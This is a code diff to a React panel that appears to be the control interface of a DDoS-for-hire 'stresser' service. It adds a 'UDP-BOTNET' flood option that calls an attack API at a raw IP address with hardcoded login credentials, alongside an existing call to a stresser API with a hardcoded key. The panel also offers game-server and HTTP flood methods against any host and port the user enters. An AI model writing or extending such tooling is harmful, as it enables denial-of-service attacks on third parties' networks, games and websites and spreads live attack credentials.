@@ -134,12 +134,17 @@ export default function Panel() {
     if (layer === 'L4') {
       try {
         setApiError(null);
-        const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
-        let apiMethod = method;
-        if (method === 'BGMI-V2') {
-          apiMethod = 'UDP-BIG';
+        let apiUrl = '';
+        if (method === 'UDP-BOTNET') {
+          apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${target}&time=${finalDuration}&port=${port || '80'}&method=udpbig`;
+        } else {
+          const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
+          let apiMethod = method;
+          if (method === 'BGMI-V2') {
+            apiMethod = 'UDP-BIG';
+          }
+          apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
         }
-        const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
         
         // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
         // Note: With 'no-cors', we cannot read the response body or status.
@@ -512,26 +517,73 @@ export default function Panel() {
                       zIndex: 20,
                       boxShadow: '0 4px 20px rgba(0,0,0,0.5)'
                     }}>
-                      {(layer === 'L4' ? ['BGMI-V2', 'BGMI'] : ['priv-flood', 'httpbypass', 'HTTP-LOADBALANCE']).map((m) => (
-                        <div 
-                          key={m}
-                          onClick={() => {
-                            setMethod(m);
-                            setIsMethodDropdownOpen(false);
-                          }}
-                          style={{
-                            padding: '10px 12px',
-                            color: '#fff',
-                            cursor: 'pointer',
-                            background: method === m ? 'rgba(255,255,255,0.05)' : 'transparent',
-                            borderBottom: '1px solid rgba(255,255,255,0.02)'
-                          }}
-                          onMouseEnter={(e) => { if(method !== m) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
-                          onMouseLeave={(e) => { if(method !== m) e.currentTarget.style.background = 'transparent' }}
-                        >
-                          {m}
-                        </div>
-                      ))}
+                      {layer === 'L4' ? (
+                        <>
+                          <div style={{ padding: '8px 12px 4px 12px', fontSize: '0.65rem', color: '#666', fontWeight: 700, letterSpacing: '0.05em', textTransform: 'uppercase' }}>GAME METHODS</div>
+                          {['BGMI-V2', 'BGMI'].map((m) => (
+                            <div 
+                              key={m}
+                              onClick={() => {
+                                setMethod(m);
+                                setIsMethodDropdownOpen(false);
+                              }}
+                              style={{
+                                padding: '10px 12px',
+                                color: '#fff',
+                                cursor: 'pointer',
+                                background: method === m ? 'rgba(255,255,255,0.05)' : 'transparent',
+                                borderBottom: '1px solid rgba(255,255,255,0.02)'
+                              }}
+                              onMouseEnter={(e) => { if(method !== m) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
+                              onMouseLeave={(e) => { if(method !== m) e.currentTarget.style.background = 'transparent' }}
+                            >
+                              {m}
+                            </div>
+                          ))}
+                          <div style={{ padding: '8px 12px 4px 12px', fontSize: '0.65rem', color: '#666', fontWeight: 700, letterSpacing: '0.05em', textTransform: 'uppercase', borderTop: '1px solid rgba(255,255,255,0.05)', marginTop: '4px' }}>BOOTNET-METHODS</div>
+                          {['UDP-BOTNET'].map((m) => (
+                            <div 
+                              key={m}
+                              onClick={() => {
+                                setMethod(m);
+                                setIsMethodDropdownOpen(false);
+                              }}
+                              style={{
+                                padding: '10px 12px',
+                                color: '#fff',
+                                cursor: 'pointer',
+                                background: method === m ? 'rgba(255,255,255,0.05)' : 'transparent',
+                                borderBottom: '1px solid rgba(255,255,255,0.02)'
+                              }}
+                              onMouseEnter={(e) => { if(method !== m) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
+                              onMouseLeave={(e) => { if(method !== m) e.currentTarget.style.background = 'transparent' }}
+                            >
+                              {m}
+                            </div>
+                          ))}
+                        </>
+                      ) : (
+                        ['priv-flood', 'httpbypass', 'HTTP-LOADBALANCE'].map((m) => (
+                          <div 
+                            key={m}
+                            onClick={() => {
+                              setMethod(m);
+                              setIsMethodDropdownOpen(false);
+                            }}
+                            style={{
+                              padding: '10px 12px',
+                              color: '#fff',
+                              cursor: 'pointer',
+                              background: method === m ? 'rgba(255,255,255,0.05)' : 'transparent',
+                              borderBottom: '1px solid rgba(255,255,255,0.02)'
+                            }}
+                            onMouseEnter={(e) => { if(method !== m) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
+                            onMouseLeave={(e) => { if(method !== m) e.currentTarget.style.background = 'transparent' }}
+                          >
+                            {m}
+                          </div>
+                        ))
+                      )}
                     </div>
                   </>
                 )}
